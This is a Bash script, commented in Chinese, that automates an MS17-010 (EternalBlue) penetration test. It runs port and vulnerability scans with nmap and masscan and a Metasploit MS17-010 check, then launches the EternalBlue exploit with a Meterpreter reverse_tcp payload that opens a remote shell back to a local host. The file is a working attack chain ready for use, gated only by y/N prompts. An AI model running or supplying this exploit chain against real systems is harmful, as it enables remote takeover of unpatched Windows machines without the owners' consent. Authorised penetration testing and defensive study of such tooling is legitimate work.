#!/bin/bash

# MS17-010 渗透测试脚本
# 严格按照原始流程，每个步骤都需要确认

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 打印函数
print_status() { echo -e "${BLUE}[*]${NC} $1"; }
print_success() { echo -e "${GREEN}[+]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
print_error() { echo -e "${RED}[-]${NC} $1"; }

# 用户确认
confirm() {
    read -p "$1 (y/N): " -n 1 -r
    echo
    [[ $REPLY =~ ^[Yy]$ ]]
}

# 显示用法
show_usage() {
    echo "用法: $0 -t 目标IP -l 本地IP"
    echo "示例: $0 -t 192.168.1.18 -l 192.168.1.17"
}

# 参数设置
TARGET=""
LHOST=""

# 解析参数
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target) TARGET="$2"; shift 2 ;;
        -l|--lhost) LHOST="$2"; shift 2 ;;
        -h|--help) show_usage; exit 0 ;;
        *) print_error "未知参数: $1"; show_usage; exit 1 ;;
    esac
done

# 验证参数
if [[ -z "$TARGET" || -z "$LHOST" ]]; then
    print_error "必须指定目标IP和本地IP"
    show_usage
    exit 1
fi

# 主函数
main() {
    echo "========================================"
    echo "      MS17-010 渗透测试脚本"
    echo "========================================"
    echo "目标: $TARGET"
    echo "本地: $LHOST"
    echo "========================================"
    echo ""

    # 1. 详细端口扫描
    if confirm "是否执行详细端口扫描: nmap -p 1-65535 -A $TARGET"; then
        print_status "执行详细端口扫描..."
        nmap -p 1-65535 -A "$TARGET"
        print_success "端口扫描完成"
    fi

    echo ""

    # 2. 快速端口扫描
    if confirm "是否执行快速端口扫描: masscan --rate=10000 $TARGET"; then
        print_status "执行快速端口扫描..."
        masscan --rate=10000 -p1-65535 "$TARGET"
        print_success "快速扫描完成"
    fi

    echo ""

    # 3. 漏洞扫描
    if confirm "是否执行漏洞扫描: nmap --script=vuln $TARGET"; then
        print_status "执行漏洞扫描..."
        nmap --script=vuln "$TARGET"
        print_success "漏洞扫描完成"
    fi

    echo ""

    # 4. MS17-010 检测
    if confirm "是否检测MS17-010漏洞"; then
        print_status "检测MS17-010漏洞..."
        msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $TARGET; run; exit"
        print_success "漏洞检测完成"
    fi

    echo ""

    # 5. MS17-010 利用
    if confirm "是否利用MS17-010漏洞"; then
        print_status "准备利用MS17-010..."
        print_warning "目标: $TARGET"
        print_warning "本地: $LHOST"
        print_warning "载荷: windows/x64/meterpreter/reverse_tcp"
        
        if confirm "确认开始漏洞利用"; then
            msfconsole -q -x "
                use exploit/windows/smb/ms17_010_eternalblue;
                set RHOSTS $TARGET;
                set PAYLOAD windows/x64/meterpreter/reverse_tcp;
                set LHOST $LHOST;
                run;
            "
            print_success "漏洞利用完成"
        else
            print_warning "取消漏洞利用"
        fi
    fi

    echo ""
    print_success "所有操作完成"
}

# 检查工具
check_tools() {
    for tool in nmap masscan msfconsole; do
        if ! command -v "$tool" &> /dev/null; then
            print_error "未找到 $tool，请先安装"
            exit 1
        fi
    done
}

# 脚本入口
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    check_tools
    if confirm "开始渗透测试?"; then
        main
    else
        print_warning "用户取消操作"
    fi
fi
